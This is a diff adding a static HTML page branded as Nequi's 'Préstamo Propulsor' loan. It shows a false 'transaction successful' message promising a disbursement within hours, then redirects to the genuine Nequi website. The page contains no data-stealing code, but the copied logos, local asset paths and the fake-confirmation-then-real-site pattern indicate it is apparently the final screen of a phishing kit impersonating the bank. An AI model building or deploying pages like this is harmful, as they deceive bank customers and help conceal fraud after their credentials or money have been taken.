@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi | Préstamo Propulsor</title>
+    <link rel="shortcut icon" href="./assets/pse/N_logo.png" type="image/x-icon">
+    <link rel="stylesheet" href="./css/tw.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/nequ.css">
+</head>
+<body>
+    <nav class="w-full flex justify-center fixed bg-white z-[10] border-b border-b-1 border-gray-200">
+        <div class="w-full p-4 max-w-[1200px] flex justify-between items-center">
+            <img src="./assets/pse/logo_nequi.svg">
+            <div class="hidden sm:flex items-center gap-6 mrp">
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Inicio</a>
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Para personas</a>
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Ayuda</a>
+                <a href="#" class="text-[#200020] hover:text-[#DA0081] transition-colors">Conócenos</a>
+                <div class="h-10 w-[1px] bg-gray-200"></div>
+                <button class="py-3 px-10 text-sm text-[#200020] border border-[#200020] bg-white rounded hover:bg-[#200020] hover:text-white transition-colors">
+                    Entrar
+                </button>
+                <button class="py-3 px-10 text-sm text-white bg-[#DA0081] rounded hover:bg-[#b3006b] transition-colors">
+                    Recargar
+                </button>
+            </div>
+            <div class="sm:hidden cursor-pointer">
+                <img src="./assets/pse/hamb_nequi.png" width="30px">
+            </div>
+        </div>
+    </nav>
+    
+    <section class="min-h-screen w-full px-2 flex items-center justify-center bg-[#fbe5f2] bg-nequi pt-[70px] mrp">    
+        <div class="w-full md:w-[500px] bg-white rounded-lg p-8 shadow-lg">
+            <div class="text-center">
+                <div class="w-20 h-20 bg-[#DA0081] rounded-full flex items-center justify-center mx-auto mb-6">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                    </svg>
+                </div>
+                <h1 class="text-2xl font-bold text-[#200020] mb-4">¡Transacción Exitosa!</h1>
+                <p class="text-gray-600 mb-6">
+                    Tu crédito será desembolsado en las próximas horas. Te enviaremos una notificación cuando el proceso se haya completado.
+                </p>
+                <div class="bg-gray-50 rounded-lg p-4 mb-6">
+                    <p class="text-sm text-gray-500">
+                        Si tienes alguna pregunta, no dudes en contactar a nuestro servicio de atención al cliente.
+                    </p>
+                </div>
+                <button onclick="window.location.href='https://www.nequi.com.co/'" class="w-full py-3 bg-[#DA0081] text-white rounded-lg hover:bg-[#b3006b] transition-colors">
+                    Volver al inicio
+                </button>
+            </div>
+        </div>
+    </section>
+</body>
+</html> 
